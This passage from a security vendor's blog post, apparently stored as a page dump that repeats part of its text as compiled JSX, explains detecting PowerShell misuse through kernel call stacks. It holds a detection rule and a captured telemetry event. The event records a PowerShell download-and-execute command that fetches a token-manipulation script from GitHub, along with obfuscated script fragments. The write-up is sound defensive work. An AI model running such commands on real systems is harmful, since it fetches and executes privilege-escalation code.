\"kernel32.dll!FatalExit\",\n     \"amsi_filenames\": [\n      \"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\Modules\\\\Microsoft.PowerShell.Utility\\\\Microsoft.PowerShell.Utility.psd1\",\n      \"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\Modules\\\\Microsoft.PowerShell.Utility\\\\Microsoft.PowerShell.Utility.psm1\"\n     ]\n    },\n    \"behaviors\": [\n     \"sensitive_api\",\n     \"hollow_image\",\n     \"unbacked_rwx\"\n    ],\n    \"name\": \"VirtualProtect\",\n    \"parameters\": {\n     \"address\": 140727652261072,\n     \"size\": 33,\n     \"protection_old\": \"R-X\",\n     \"protection\": \"RWX\"\n    }\n   },\n   \"code_signature\": [\n    {\n     \"trusted\": true,\n     \"subject_name\": \"Microsoft Windows\",\n     \"exists\": true,\n     \"status\": \"trusted\"\n    }\n   ],\n   \"token\": {\n    \"integrity_level_name\": \"high\"\n   }\n  },\n  \"thread\": {\n   \"Ext\": {\n    \"call_stack_summary\": \"ntdll.dll|kernelbase.dll|Unbacked\",\n    \"call_stack_contains_unbacked\": true,\n    \"call_stack\": [\n     {\n      \"symbol_info\": \"c:\\\\windows\\\\system32\\\\ntdll.dll!NtProtectVirtualMemory+0x14\"\n     },\n     {\n      \"symbol_info\": \"c:\\\\windows\\\\system32\\\\kernelbase.dll!VirtualProtect+0x3b\"\n     },\n     {\n      \"symbol_info\": \"Unbacked+0x3b5c\",\n      \"protection_provenance\": \"clr.dll\",\n      \"callsite_trailing_bytes\": \"41c644240c01833dab99f35f007406ff15b7b6f25f8bf0e85883755f85f60f95c00fb6c00fb6c041c644240c01488b55884989542410488d65c85b5e5f415c41\",\n      \"protection\": \"RWX\",\n      \"callsite_leading_bytes\": \"df765f4d63f64c897dc0488d55b8488bcee8ee6da95f4d8bcf488bcf488bd34d8bc64533db4c8b55b84c8955904c8d150c0000004c8955a841c644240c00ffd0\"\n     }\n    ],\n    \"call_stack_final_user_module\": {\n     \"code_signature\": [\n      {\n       \"trusted\": true,\n       \"subject_name\": \"Microsoft Corporation\",\n       \"exists\": true,\n       \"status\": \"trusted\"\n      }\n     ],\n     \"protection_provenance_path\": \"c:\\\\windows\\\\microsoft.net\\\\framework64\\\\v4.0.30319\\\\clr.dll\",\n     \"name\": \"Unbacked\",\n     \"protection_provenance\": \"clr.dll\",\n     \"protection\": \"RWX\",\n     \"hash\": {\n      \"sha256\": \"707564fc98c58247d088183731c2e5a0f51923c6d9a94646b0f2158eb5704df4\"\n     }\n    }\n   },\n   \"id\": 17260\n  }\n },\n \"user\": {\n  \"id\": \"S-1-5-21-47396387-2833971351-1621354421-500\"\n }\n}\n```\n## **Robustness assessment**\n\nUsing the [Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/) analytic scoring methodology we can compare our PowerShell modality-based detection rule with traditional PowerShell \n\n|  | Application (A) | User mode (U) | Kernel mode (K) |\n| :---- | :---- | :---- | :---- |\n| **Core to (Sub) Technique (5)** |  |  | **\\[ best \\]** Kernel ETW-based PowerShell modality detections |\n| **Core to Part of (Sub-) Technique (4)** |  |  |  |\n| **Core to Pre-Existing Tool (3)** |  |  |  |\n| **Core to Adversary-brought Tool (2)** | AMSI and ScriptBlock-based PowerShell content detections |  |  |\n| **Ephemeral (1)** | **\\[ worst \\]** |  |  |\n\nPowerShell Analytic Scoring using [Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/)\n\nAs noted earlier, most PowerShell detections receive a low 2A robustness score using the STP scale.  This is in stark contrast to our [PowerShell misbehaving modality rule](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/windows/execution_suspicious_api_call_from_a_powershell_script.toml) which receives the highest possible 5K score (where appropriate kernel telemetry is available from Microsoft).\n\nOne caveat is that an STP analytic score does not yet include any measure for the setup and maintenance costs of a rule. This could potentially be approximated by the size of the known false positive software list for a given rule - though most open rule sets typically do not include this information. We do and, in our rule’s case, the false positives observed to date have been extremely manageable.\n\n## **Can call stacks be spoofed though?**\n\nYes - and slightly no. Our call stacks are all collected inline in the kernel, but the user-mode call stack itself resides in user-mode memory that the malware may control. This means that, if malware has achieved arbitrary execution, then it can control the stack frames that we see.\n\nSure, dual-purpose API [calls from private memory](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+%22Unbacked+memory%22\u0026type=code) are suspicious, but sometimes trying to hide your private memory is even more suspicious. This can take the form of:\n\n* Calls from [overwritten modules](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+allocation_private_bytes\u0026type=code).  \n* Return addresses [without a preceding call](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+image_rop\u0026type=code) instruction.  \n* Calls [proxied via other modules](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+proxy_call\u0026type=code).\n\nCall stack control alone may not be enough. In order to truly bypass some of our call stack detections, an attacker must craft a call stack that entirely blends with normal activity.  In some environments this can be baselined by security teams with high accuracy; making it hard for the attackers to remain undetected. Based on our in-house research, and with the assistance of red team tool developers, we are also continually improving our out-of-the-box detections.\n\nFinally, on modern CPUs there are also numerous execution trace mechanisms that can be used to detect stack spoofing - such as [Intel LBR](https://www.blackhat.com/docs/us-16/materials/us-16-Pierce-Capturing-0days-With-PERFectly-Placed-Hardware-Traps-wp.pdf), Intel BTS, Intel AET, [Intel IPT](https://www.microsoft.com/en-us/research/wp-content/uploads/2017/01/griffin-asplos17.pdf), [x64 CET](https://www.elastic.co/security-labs/finding-truth-in-the-shadows) and [x64 Architectural LBR](https://lwn.net/Articles/824613/). Elastic already takes advantage of some of these hardware features, we have suggested to Microsoft that they may also wish to do so in further scenarios outside of exploit protection, and we are investigating further enhancements ourselves. Stay tuned.\n\n## **Conclusion**\n\nExecution Modality is a new lens through which we can seek to understand attacker tradecraft. \n\nDetecting specific techniques for individual modalities is not a cost-effective approach though - there are simply too many techniques and too many modalities. Instead, we should focus our technique detections as close to the operating system source of truth as possible; being careful not to lose necessary activity context, or to introduce unmanageable false positives. This is why Elastic considers [Kernel ETW](https://www.elastic.co/security-labs/kernel-etw-best-etw) to be superior to user-mode `ntdll` hooking - it is closer to the source of truth allowing more robust detections.\n\nFor modality-based detection approaches, the value becomes apparent when we baseline **all** expected low-level telemetry for a given modality - and trigger on **any** deviations.\n\nHistorically, attackers have been able to choose modality for convenience. It is more cost effective to write tools in C# or PowerShell than in C or assembly.  If we can herd modality then we’ve imposed cost.","code":"var Component=(()=\u003e{var h=Object.create;var r=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var u=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var g=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),w=(n,e)=\u003e{for(var o in e)r(n,o,{get:e[o],enumerable:!0})},a=(n,e,o,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let i of u(e))!f.call(n,i)\u0026\u0026i!==o\u0026\u0026r(n,i,{get:()=\u003ee[i],enumerable:!(s=m(e,i))||s.enumerable});return n};var y=(n,e,o)=\u003e(o=n!=null?h(p(n)):{},a(e||!n||!n.__esModule?r(o,\"default\",{value:n,enumerable:!0}):o,n)),b=n=\u003ea(r({},\"__esModule\",{value:!0}),n);var c=g((_,l)=\u003e{l.exports=_jsx_runtime});var S={};w(S,{default:()=\u003ek,frontmatter:()=\u003ev});var t=y(c()),v={title:\"Misbehaving Modalities: Detecting Tools, Not Techniques\",slug:\"misbehaving-modalities\",date:\"2025-05-15\",description:\"We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones.\",author:[{slug:\"john-uhlmann\"}],image:\"modalities.png\",category:[{slug:\"security-research\"},{slug:\"detection-science\"}]};function d(n){let e=Object.assign({h2:\"h2\",strong:\"strong\",p:\"p\",a:\"a\",em:\"em\",img:\"img\",code:\"code\",pre:\"pre\",ul:\"ul\",li:\"li\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},n.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:\"what-is-execution-modality\",children:(0,t.jsx)(e.strong,{children:\"What is Execution Modality?\"})}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://medium.com/@jaredcatkinson\",rel:\"nofollow\",children:\"Jared Atkinson\"}),\", Chief Strategist at SpecterOps and prolific writer on security strategy, recently introduced the very useful concept of \",(0,t.jsx)(e.a,{href:\"https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739\",rel:\"nofollow\",children:\"Execution Modality\"}),\" to help us reason about malware techniques, and how to robustly detect them. In short, Execution Modality describes \",(0,t.jsx)(e.em,{children:\"how\"}),\" a malicious behaviour is executed, rather than simply defining \",(0,t.jsx)(e.em,{children:\"what\"}),\" the behaviour does.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"For example, the behaviour of interest might be \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/003/\",rel:\"nofollow\",children:\"Windows service creation\"}),\", and the modality might be either a system utility (such as `sc.exe`), a PowerShell script, or shellcode that uses indirect syscalls to directly write to the service configuration in the Windows Registry.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Atkinson outlined that if your goal is to detect a specific technique, you want to ensure that your collection is as close as possible to the operating system\\u2019s source of truth and eliminate any modality assumptions.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"case-study-service-creation-modalities\",children:(0,t.jsx)(e.strong,{children:\"Case Study: service creation modalities\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/misbehaving-modalities/flow.png\",alt:\"Service creation operation flow graph\",width:\"1999\",height:\"874\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the typical Service creation scenario within the Windows OS, an installer calls \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create\",rel:\"nofollow\",children:(0,t.jsx)(e.code,{children:\"sc.exe create\"})}),\" which makes an \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/6a8ca926-9477-4dd4-b766-692fab07227e\",rel:\"nofollow\",children:(0,t.jsx)(e.code,{children:\"RCreateService\"})}),\" RPC call to an endpoint in the \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager\",rel:\"nofollow\",children:\"Service Control Manager\"}),\" (SCM, aka \",(0,t.jsx)(e.code,{children:\"services.exe\"}),\") which then makes syscalls to the \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-configuration-manager\",rel:\"nofollow\",children:\"kernel-mode configuration manager\"}),\" to update the \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services\",rel:\"nofollow\",children:\"database of installed services\"}),\" in the registry.  This is later flushed to disk and restored from disk on boot.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"This means that the source of truth for a running system \",(0,t.jsx)(e.a,{href:\"https://abstractionmaps.com/maps/t1050/\",rel:\"nofollow\",children:\"is the registry\"}),\" (though hives are flushed to disk and can be tampered with offline).\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"In a threat hunting scenario, we could easily detect anomalous \",(0,t.jsx)(e.code,{children:\"sc.exe\"}),\" command lines - but a different tool might make Service Control RPC calls directly.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"If we were processing our threat data stringently, we could also detect anomalous Service Control RPC calls, but a different tool might make syscalls (in)directly or use another service, such as the \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/ec095de8-b4fe-48fb-8114-dea65b4d710e\",rel:\"nofollow\",children:\"Remote Registry\"}),\", to update the service database indirectly.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"In other words, some of these execution modalities bypass traditional telemetry such as \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4697\",rel:\"nofollow\",children:\"Windows event logs\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"So how do we monitor changes to the configuration manager?  We can\\u2019t robustly monitor syscalls directly due to \",(0,t.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/Kernel_Patch_Protection\",rel:\"nofollow\",children:\"Kernel Patch Protection\"}),\", but Microsoft has provided \",(0,t.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/filtering-registry-calls\",rel:\"nofollow\",children:\"configuration manager callbacks\"}),\" as an alternative. This is where Elastic has \",(0,t.jsx)(e.a,{href:\"https://github.com/tsale/EDR-Telemetry/pull/58#issuecomment-2043958734\",rel:\"nofollow\",children:\"focused our service creation detection\"}),\" efforts - as close to the operating system\\u2019s source of truth as possible.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The trade-off for this low-level visibility, however, is a potential reduction in context. For example, due to Windows architectural decisions, security vendors do not know which RPC client is requesting the creation of a registry key in the services database. Microsoft only supports querying RPC client details from a user-mode RPC service.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Starting with Windows 10 21H1, Microsoft began including \",(0,t.jsx)(e.a,{href:\"https://github.com/jdu2600/Windows10EtwEvents/commit/5444e040d65ed2807fcf9ac69ce32131338dc370#diff-b88b65ff9fd39a51c51c594ee3787ea6907e780d4282ae9a7517c04074e2c2b7\",rel:\"nofollow\",children:\"RPC client details in the service creation event log\"}),\". This event, while less robust, sometimes provides additional context that might assist in determining the source of an anomalous behaviour.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Due to their history of abuse, some modalities have been extended with extra logging - one important example is PowerShell.  This allows certain techniques to be detected with high precision - but \",(0,t.jsx)(e.em,{children:\"only\"}),\" when executed within PowerShell. It is important not to conflate having detection coverage of a technique in PowerShell with coverage of that technique in general. This nuance is important when estimating \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" coverage.  As red teams routinely demonstrate, having 100% technique coverage - but only for PowerShell - is close to 0% real-world coverage.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://ctid.mitre.org/projects/summiting-the-pyramid/\",rel:\"nofollow\",children:\"Summiting the Pyramid\"}),\" (STP) is a related analytic scoring methodology from MITRE. It makes a similar conclusion about the fragility of \",(0,t.jsx)(e.a,{href:\"https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/service_registry_permissions_weakness_check/\",rel:\"nofollow\",children:\"PowerShell scriptblock-based detections\"}),\" and assigns such rules a low robustness score.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"High-level telemetry sources, such as Process Creation logging and PowerShell logging, are extremely brittle at detecting most techniques as they cover very few modalities. At best, they assist in detecting the most egregious Living off the Land (LotL) abuses.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Atkinson made the following astute observation in the \",(0,t.jsx)(e.a,{href:\"https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739\",rel:\"nofollow\",children:\"example\"}),\" used to motivate the discussion:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"An important point is that our higher-order objective in detection is behavior-based, not modality-based. Therefore, we should be interested in detecting Session Enumeration (behavior-focused), not Session Enumeration in PowerShell (modality-focused).\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Sometimes that is only half of the story though.  Sometimes detecting that the tool itself is out of context is more efficient than detecting the technique. Sometimes the execution modality itself is anomalous.\"}),`\n`,(0,t.jsx)(e.p,{children:\"An alternative to detecting a known technique is to detect a misbehaving modality.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"call-stacks-divulge-modality\",children:(0,t.jsx)(e.strong,{children:\"Call stacks divulge Modality\"})}),`\n`,(0,t.jsx)(e.p,{children:\"One of Elastic\\u2019s strengths is the inclusion of call stacks in the majority of our events. This level of call provenance detail greatly assists in determining whether a given activity is malicious or benign.  Call stack summaries are often sufficient to divulge the execution modality - the runtimes for PowerShell, .NET, RPC, WMI, VBA, Lua, Python, and Java all leave traces in the call stack.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Some of our \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks\",rel:\"nofollow\",children:\"first call stack-based rules\"}),\" were for Office VBA macros (\",(0,t.jsx)(e.code,{children:\"vbe7.dll\"}),\") spawning child processes or dropping files, and for unbacked executable memory loading the .NET runtime.  In both of these examples, the technique itself was largely benign; it was the modality of the behaviour that was predominantly anomalous.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"So can we flip the typical behaviour-focused detection approach to a modality-focused one?  For example, can we detect solely on the use of \",(0,t.jsx)(e.strong,{children:\"any\"}),\" dual-purpose API call originating from PowerShell?\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Using call stacks, Elastic is able to differentiate between the API calls that originate from PowerShell scripts and those that come from the PowerShell or .NET runtimes.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Using Threat-Intelligence ETW as an approximation for a dual-purpose API, our rule for \\u201CSuspicious API Call from a PowerShell Script\\u201D was quite effective.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-sql\",children:`api where\nevent.provider == \"Microsoft-Windows-Threat-Intelligence\" and\nprocess.name in~ (\"powershell.exe\", \"pwsh.exe\", \"powershell_ise.exe\") and\n\n/* PowerShell Script JIT - and incidental .NET assemblies */\nprocess.thread.Ext.call_stack_final_user_module.name == \"Unbacked\" and\nprocess.thread.Ext.call_stack_final_user_module.protection_provenance in (\"clr.dll\", \"mscorwks.dll\", \"coreclr.dll\") and\n\n/* filesystem enumeration activity */\nnot process.Ext.api.summary like \"IoCreateDevice( \\\\\\\\FileSystem\\\\\\\\*, (null) )\" and\n\n/* exclude nop operations */\nnot (process.Ext.api.name == \"VirtualProtect\" and process.Ext.api.parameters.protection == \"RWX\" and process.Ext.api.parameters.protection_old == \"RWX\") and\n\n/* Citrix GPO Scripts */\nnot (process.parent.executable : \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\gpscript.exe\" and\n  process.Ext.api.summary in (\"VirtualProtect( Unbacked, 0x10, RWX, RW- )\", \"WriteProcessMemory( Self, Unbacked, 0x10 )\", \"WriteProcessMemory( Self, Data, 0x10 )\")) and\n\n/* cybersecurity tools */\nnot (process.Ext.api.name == \"VirtualAlloc\" and process.parent.executable : (\"C:\\\\\\\\Program Files (x86)\\\\\\\\CyberCNSAgent\\\\\\\\cybercnsagent.exe\", \"C:\\\\\\\\Program Files\\\\\\\\Velociraptor\\\\\\\\Velociraptor.exe\")) and\n\n/* module listing */\nnot (process.Ext.api.name in (\"EnumProcessModules\", \"GetModuleInformation\", \"K32GetModuleBaseNameW\", \"K32GetModuleFileNameExW\") and\n  process.parent.executable : (\"*\\\\\\\\Lenovo\\\\\\\\*\\\\\\\\BGHelper.exe\", \"*\\\\\\\\Octopus\\\\\\\\*\\\\\\\\Calamari.exe\")) and\n\n/* WPM triggers multiple times at process creation */\nnot (process.Ext.api.name == \"WriteProcessMemory\" and\n     process.Ext.api.metadata.target_address_name in (\"PEB\", \"PEB32\", \"ProcessStartupInfo\", \"Data\") and\n     _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like (\"?:\\\\\\\\windows\\\\\\\\*\\\\\\\\kernelbase.dll!CreateProcess*\", \"Unknown\")))\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Even though we don\\u2019t need to use the brittle PowerShell AMSI logging for detection, we can still provide this detail in the event as context as it assists with triage.  This modality-based approach even detects common PowerShell defence evasion tradecraft such as:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"ntdll unhooking\"}),`\n`,(0,t.jsx)(e.li,{children:\"AMSI patching\"}),`\n`,(0,t.jsx)(e.li,{children:\"user-mode ETW patching\"}),`\n`]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-json\",children:`{\n \"event\": {\n  \"provider\": \"Microsoft-Windows-Threat-Intelligence\",\n  \"created\": \"2025-01-29T18:27:09.4386902Z\",\n  \"kind\": \"event\",\n  \"category\": \"api\",\n  \"type\": \"change\",\n  \"outcome\": \"unknown\"\n },\n \"message\": \"Endpoint API event - VirtualProtect\",\n \"process\": {\n  \"parent\": {\n   \"executable\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\"\n  },\n  \"name\": \"powershell.exe\",\n  \"executable\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\n  \"code_signature\": {\n   \"trusted\": true,\n   \"subject_name\": \"Microsoft Windows\",\n   \"exists\": true,\n   \"status\": \"trusted\"\n  },\n  \"command_line\": \"\\\\\"powershell.exe\\\\\" \u0026 {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n  \"pid\": 21908,\n  \"Ext\": {\n   \"api\": {\n    \"summary\": \"VirtualProtect( kernel32.dll!FatalExit, 0x21, RWX, R-X )\",\n    \"metadata\": {\n     \"target_address_path\": \"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\kernel32.dll\",\n     \"amsi_logs\": [\n      {\n       \"entries\": [\n        \"\u0026 {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n        \"{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n        \"function Get-WinLogonTokenSystem\\\\n{\\\\nfunction _10001011000101101\\\\n{\\\\n  [CmdletBinding()]\\\\n  Param(\\\\n [Parameter(Position = 0, Mandatory = $true)]\\\\n [ValidateNotNullOrEmpty()]\\\\n [Byte[]]\\\\n \\${_00110111011010011},\\\\n ...\u003ctruncated\u003e\",\n        \"{[Char] $_}\",\n        \"{\\\\n [CmdletBinding()]\\\\n Param(\\\\n   [Parameter(Position = 0, Mandatory = $true)]\\\\n   [Byte[]]\\\\n   \\${_00110111011010011},\\\\n   [Parameter(Position = 1, Mandatory = $true)]\\\\n   [String]\\\\n   \\${_10100110010101100},\\\\n ...\u003ctruncated\u003e\",\n        \"{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\\\\\\\\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }\"\n       ],\n       \"type\": \"PowerShell\"\n      }\n     ],\n     \"target_address_name\": \"kernel32.dll!FatalExit\",\n     \"amsi_filenames\": [\n      \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\Modules\\\\\\\\Microsoft.PowerShell.Utility\\\\\\\\Microsoft.PowerShell.Utility.psd1\",\n      \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\Modules\\\\\\\\Microsoft.PowerShell.Utility\\\\\\\\Microsoft.PowerShell.Utility.psm1\"\n     ]\n    },\n    \"behaviors\": [\n     \"sensitive_api\",\n     \"hollow_image\",\n     \"unbacked_rwx\"\n    ],\n    \"name\": \"VirtualProtect\",\n    \"parameters\": {\n     \"address\": 140727652261072,\n     \"size\": 33,\n     \"protection_old\": \"R-X\",\n     \"protection\": \"RWX\"\n    }\n   },\n   \"code_signature\": [\n    {\n     \"trusted\": true,\n     \"subject_name\": \"Microsoft Windows\",\n     \"exists\": true,\n     \"status\": \"trusted\"\n    }\n   ],\n   \"token\": {\n    \"integrity_level_name\": \"high\"\n   }\n  },\n  \"thread\": {\n   \"Ext\": {\n    \"call_stack_summary\": \"ntdll.dll|kernelbase.dll|Unbacked\",\n    \"call_stack_contains_unbacked\": true,\n    \"call_stack\": [\n     {\n      \"symbol_info\": \"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\ntdll.dll!NtProtectVirtualMemory+0x14\"\n     },\n     {\n      \"symbol_info\": \"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\kernelbase.dll!VirtualProtect+0x3b\"\n     },\n     {\n      \"symbol_info\": \"Unbacked+0x3b5c\",\n      \"protection_provenance\": \"clr.dll\",\n      \"callsite_trailing_bytes\": \"41c644240c01833dab99f35f007406ff15b7b6f25f8bf0e85883755f85f60f95c00fb6c00fb6c041c644240c01488b55884989542410488d65c85b5e5f415c41\",\n      \"protection\": \"RWX\",\n      \"callsite_leading_bytes\": \"df765f4d63f64c897dc0488d55b8488bcee8ee6da95f4d8bcf488bcf488bd34d8bc64533db4c8b55b84c8955904c8d150c0000004c8955a841c644240c00ffd0\"\n     }\n    ],\n    \"call_stack_final_user_module\": {\n     \"code_signature\": [\n      {\n       \"trusted\": true,\n       \"subject_name\": \"Microsoft Corporation\",\n       \"exists\": true,\n       \"status\": \"trusted\"\n      }\n     ],\n     \"protection_provenance_path\": \"c:\\\\\\\\windows\\\\\\\\microsoft.net\\\\\\\\framework64\\\\\\\\v4.0.30319\\\\\\\\clr.dll\",\n     \"name\": \"Unbacked\",\n     \"protection_provenance\": \"clr.dll\",\n     \"protection\": \"RWX\",\n     \"hash\": {\n      \"sha256\": \"707564fc98c58247d088183731c2e5a0f51923c6d9a94646b0f2158eb5704df4\"\n     }\n    }\n   },\n   \"id\": 17260\n  }\n },\n \"user\": {\n  \"id\": \"S-1-5-21-47396387-2833971351-1621354421-500\"\n }\n}\n`})}),`\n`,(0,t.jsx)(e.h2,{id:\"robustness-assessment\",children:(0,t.jsx)(e.strong,{children:\"Robustness assessment\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Using the \",(0,t.jsx)(e.a,{href:\"https://ctid.mitre.org/projects/summiting-the-pyramid/\",rel:\"nofollow\",children:\"Summiting the Pyramid\"}),\" analytic scoring methodology we can compare our PowerShell modality-based detection rule with traditional PowerShell\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{align:\"left\"}),(0,t.jsx)(e.th,{align:\"left\",children:\"Application (A)\"}),(0,t.jsx)(e.th,{align:\"left\",children:\"User mode (U)\"}),(0,t.jsx)(e.th,{align:\"left\",children:\"Kernel mode (K)\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"Core to (Sub) Technique (5)\"})}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsxs)(e.td,{align:\"left\",children:[(0,t.jsx)(e.strong,{children:\"[ best ]\"}),\" Kernel ETW-based PowerShell modality detections\"]})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"Core to Part of (Sub-) Technique (4)\"})}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"Core to Pre-Existing Tool (3)\"})}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"Core to Adversary-brought Tool (2)\"})}),(0,t.jsx)(e.td,{align:\"left\",children:\"AMSI and ScriptBlock-based PowerShell content detections\"}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"Ephemeral (1)\"})}),(0,t.jsx)(e.td,{align:\"left\",children:(0,t.jsx)(e.strong,{children:\"[ worst ]\"})}),(0,t.jsx)(e.td,{align:\"left\"}),(0,t.jsx)(e.td,{align:\"left\"})]})]})]})}),`\n`,(0,t.jsxs)(e.p,{children:[\"PowerShell Analytic Scoring using \",(0,t.jsx)(e.a,{href:\"https://ctid.mitre.org/projects/summiting-the-pyramid/\",rel:\"nofollow\",children:\"Summiting the Pyramid\"})]}),`\n`,(0,t.jsxs)(e.p,{children:[\"As noted earlier, most PowerShell detections receive a low 2A robustness score using the STP scale.  This is in stark contrast to our \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/windows/execution_suspicious_api_call_from_a_powershell_script.toml\",rel:\"nofollow\",children:\"PowerShell misbehaving modality rule\"}),\" which receives the highest possible 5K score (where appropriate kernel telemetry is available from Microsoft).\"]}),`\n`,(0,t.jsx)(e.p,{children:\"One 